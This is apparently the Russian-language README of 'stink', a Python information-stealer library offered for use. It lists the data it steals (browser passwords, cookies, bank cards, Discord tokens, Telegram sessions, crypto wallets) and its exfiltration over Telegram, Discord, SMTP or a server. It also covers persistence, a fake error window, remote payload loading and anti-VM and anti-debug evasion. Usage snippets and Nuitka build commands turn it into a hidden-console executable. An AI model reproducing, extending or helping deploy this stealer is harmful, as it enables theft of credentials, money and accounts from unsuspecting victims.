# stink

Стиллер всего лишь в несколько строк с отправкой в Telegram / Server / Discord / SMTP. Без зависимостей, только встроенные библиотеки.

**Wiki:** https://github.com/FallenAstaroth/stink/wiki

## Описание
`stink` уже имеет внушительный функционал, который будет только расширяться.

## Навигация
* [Текущие возможности](#Текущие-возможности)
* [Пример использования](#Пример-использования)
  * [Стандартный](#Стандартный)
  * [Определённые модули](#Определённые-модули)
  * [Дополнительные параметры](#Дополнительные-параметры)
* [Создание exe](#Создание-exe)
  * [Создание исполняемого файла](#Создание-исполняемого-файла)
  * [С помощью BAT](#С-помощью-BAT)
  * [С помощью CMD](#С-помощью-CMD)

### Текущие возможности
1. Поддержка следующих браузеров:
   - Chrome
   - Opera
   - Opera GX
   - Edge
   - Brave
   - Vivaldi
   - Yandex (Частично)
2. Сбор следующих данных:
   - Скриншот
   - Куки
   - Пароли
   - Банковские карты
   - История
   - Закладки
   - IP-адрес
   - Конфигурация системы
   - Активные процессы
   - Токены Discord
   - Сессии Telegram
   - Хосты FileZilla
   - Крипто кошельки:
       - Metamask
       - Phantom
       - Atomic
       - Exodus
       - Другие 10 кошельков
   - Конфиги Steam
3. Встроенные методы отправки:
   - Telegram
   - Server
   - Discord
   - SMTP
4. Поддержка мультипрофилей браузера.
5. Выполнение в отдельном потоке.
6. Выполнение с использованием многопроцессорности.
7. Возможность добавления в автозагрузку.
8. Вывод окна с фейковой ошибкой.
9. Выполнение без создания каких-либо файлов.
10. Подгрузка и запуск файлов по ссылке.
11. Сбор файлов указанного формата по указанным директориям.
12. Прекращение работы на виртуальных машинах и при попытке дебаггинга.

## Пример использования
### Стандартный
```python
from stink import Stealer, Senders

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```
### Определённые модули

Пример со сбором только системных данных и скриншота.
```python
from stink import Stealer, Features, Senders

if __name__ == '__main__':
    Stealer(
        senders=[
            Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)
        ], 
        features=[
            Features.system,
            Features.screenshot
        ]
    ).run()
```
### Дополнительные параметры

- `features` - список модулей из `stink.Features`:

  - `passwords` - сбор паролей.

  - `cookies` - сбор куки.

  - `cards` - сбор банковских карт.

  - `history` - сбор истории поиска.

  - `bookmarks` - сбор закладок.

  - `extensions` - сбор расширений браузера.

  - `processes` - сбор активных процессов.

  - `system` - сбор конфигурации системы.

  - `screen` - скриншот.

  - `discord` - сбор токенов Discord.

  - `telegram` – сбор сессий Telegram.

  - `filezilla` – сбор хостов FileZilla.

  - `wallets` – сбор крипто кошельков.

  - `steam` - сбор конфигов Steam.
  

- `utils` - список утилит из `stink.Utils`:

  - `autostart` - добавление в автозагрузку.

  - `message` - вывод фейкового [окна ошибки](https://github.com/FallenAstaroth/stink/wiki/Fake-error).
  

- `protectors` - список протекторов из `stink.Protectors`:

  - `processes` - проверка процессов на наличие программ для дебагинга и виртуальных машин.

  - `mac_address` - проверка MAC аддрессов на присутствие в чёрном списке.

  - `computer` - проверка названия PC на присутствие в чёрном списке.

  - `user` - проверка имени пользователя на присутствие в чёрном списке.

  - `hosting` - проверка находится ли PC на хостинге.

  - `http_simulation` - проверка на симуляцию HTTP.

  - `virtual_machine` - проверка на виртуальную машину.

  - `disable` - полное отключение всех проверок.

  - `all` - включение всех проверок.


- `senders` - список способов отправки из `stink.Senders`:

  - `server` - отправка на [сервер](https://github.com/FallenAstaroth/stink/wiki/Server).

  - `telegram` - отправка в [Telegram](https://github.com/FallenAstaroth/stink/wiki/Telegram-bot).

  - `discord` - отправка в [Discord](https://github.com/FallenAstaroth/stink/wiki/Discord-hook).

  - `smtp` - отправка на [почту](https://github.com/FallenAstaroth/stink/wiki/Smtp).


- `loaders` - список подгрузчиков файлов из `stink`:

  - `Loader` - универсальный [подгрузчик](https://github.com/FallenAstaroth/stink/wiki/Files-loader).


- `grabbers` - список сборщиков файлов из `stink`:

  - `Grabber` - универсальный [сборщик](https://github.com/FallenAstaroth/stink/wiki/Collection-of-specific-files).

## Создание exe
Python является интерпретируемым языком программирования, поэтому мы сначала транслируем его в C, а затем скомпилируем в .exe файл.
Для этого нам понадобится Nuitka.

### Создание исполняемого файла

1. [Скачиваем](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) архив.
2. Распаковываем архив и переходим в директорию stink-master.
3. Создаем test.py (или любое другое название) файл в этой же директории со следующим кодом:
```python
from stink import Stealer, Senders

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```

### С помощью BAT
1. Запускаем compiler.bat.

### С помощью CMD
1. Открываем `cmd`.
2. Прописываем команду:
```
pip install virtualenv
```
3. Переходим в папку с файлом `test.py`:
```
cd path\to\file
```
4. Создаем виртуальное окружение и активируем его:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Устанавливаем Nuitka:
````
pip install Nuitka
````
6. Для уменьшения размера файла дополнительно устанавливаем Zstandard (опционально):
```
pip install zstandard
```
7. Прописываем команду:
```
nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
```

После выполнения команды получаем test.exe файл со скрытой консолью.
